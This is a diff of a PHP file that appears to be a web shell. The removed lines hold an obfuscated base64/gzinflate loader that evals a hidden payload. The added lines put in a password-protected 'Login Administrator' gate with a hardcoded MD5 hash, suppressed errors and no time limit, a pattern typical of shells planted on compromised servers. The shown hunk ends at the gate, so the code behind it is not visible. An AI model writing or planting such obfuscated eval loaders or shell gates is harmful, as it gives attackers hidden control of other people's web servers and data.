@@ -1,6 +1,33 @@
 <?php
-$SISTEMIT_COM_ENC = "jVOxauNAEO0N/oiIgOzicBxjW5eTFK5IEQhJwNeFQyCBVJwkxDYX58jHBIMKL1u42Eqo2fmxe7OKY4tg7lCx0uybeW/mjYaD84pa2tHuNzWCaqMDo93l1Ft89aidz0kli0svmS6S5HJKrZd6y4tFOpvP3G/DASkhkBUJUhVnS9qW2ehizFc7UiQjDhWkopyPLcnu8v0apIg1ZYRTUov8kU3dpkaPznC166qMzqPVzWp1+3D/5ObUZBmC9W3p/hyPjf4zHBjdPadgtqeU2pzLgeDVKrAsPZLHh9WPJ7c3jk8cXVpB9fxkAujA1x9rv8h/CSYpaGP17uHQ/Wr0QfzZyblcGX0dMtCnN5JFHvKpIKjGm2QjclLhHXLgmNHfqYY7pR0GWFtAGuFPDki87/M7OX5MDdVro+MsoQbkInDinNrklxMeBPsJqRJVlDgOVugNXmyzMnA+AE54BPZTbAVJ4KBnDQGB00W+8Ma8kLqazqpnx+gPbsGtO9blhOFc55nxNfaqrwmVRGF0waajK7QRONhepjrGWSyGUsEEViLXFRfuuQrCktric/zfdQDexPaXOCrSC5Kd0objXOPdLMwp7k1zYvvZ2zLpfMGntYyt5zX4Cw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="EO0N/oiIgOzicBxjW5eTFK5IEQhJwNeFQyCBVJwkxDYX58jHBIMKL1u42Eqo2fmxe7OKY4tg7lCx0uybeW/mjYaD84pa2tHuNzWCaqMDo93l1Ft89aidz0kli0svmS6S5HJKrZd6y4tFOpvP3G/DASkhkBUJUhVnS9qW2ehizFc7UiQjDhWkopyPLcnu8v0apIg1ZYRT";
-?>
+$password = '718698a55ec628c16cc21a8f8706f353';
+error_reporting(0);
+set_time_limit(0);
+
+session_start();
+if (!isset($_SESSION['loggedIn'])) {
+    $_SESSION['loggedIn'] = false;
+}
+
+if (isset($_POST['password'])) {
+    if (md5($_POST['password']) == $password) {
+        $_SESSION['loggedIn'] = true;
+    }
+} 
+
+if (!$_SESSION['loggedIn']): ?>
+
+<html><head><title>Login Administrator</title></head>
+  <body bgcolor="black">
+    <center>
+    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
+    <form method="post">
+      <input type="password" name="password">
+      <input type="submit" name="submit" value="  Login"><br>
+    </form>
+  </body>
+</html>
+
+<?php
 exit();
 endif;
 ?>
